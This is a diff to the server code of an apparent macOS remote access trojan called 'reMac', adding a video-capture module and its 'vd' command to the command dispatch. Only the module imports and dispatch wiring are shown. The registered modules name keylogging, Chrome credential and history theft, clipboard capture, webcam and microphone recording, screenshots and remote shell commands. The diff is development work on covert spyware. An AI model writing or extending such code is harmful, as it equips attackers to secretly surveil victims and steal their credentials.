@@ -2,7 +2,7 @@ import sys
 
 from apps.server.modules import mod_clipboard, mod_keylogger, mod_hello, mod_chrome_logins, mod_chrome_history
 from apps.server.modules import mod_shellcmd, mod_screenshot, mod_webcam, mod_recmic, mod_modHelp, mod_info
-from apps.server.modules import mod_download, mod_upload, mod_help
+from apps.server.modules import mod_download, mod_upload, mod_help, mod_video
 
 from apps.libs.reMac_libbase import reMac_libbase
 
@@ -20,6 +20,7 @@ reMacModules = [
     mod_info.mod_info(),
     mod_download.mod_download(),
     mod_upload.mod_upload(),
+    mod_video.mod_video(),
     mod_help.mod_help()
 ]
 
@@ -73,6 +74,7 @@ class reMac_libserver(reMac_libbase):
             pass
         elif input == "hw" \
                 or input == "ch" \
+                or input == "vd" \
                 or input == "cl" \
                 or input == "wc" \
                 or input == "hp" \
@@ -109,6 +111,7 @@ class reMac_libserver(reMac_libbase):
         value = self.request.get("value")
         if action == "hw" \
                 or action == "cb" \
+                or action == "vd" \
                 or action == "ch" \
                 or action == "cl" \
                 or action == "sh" \
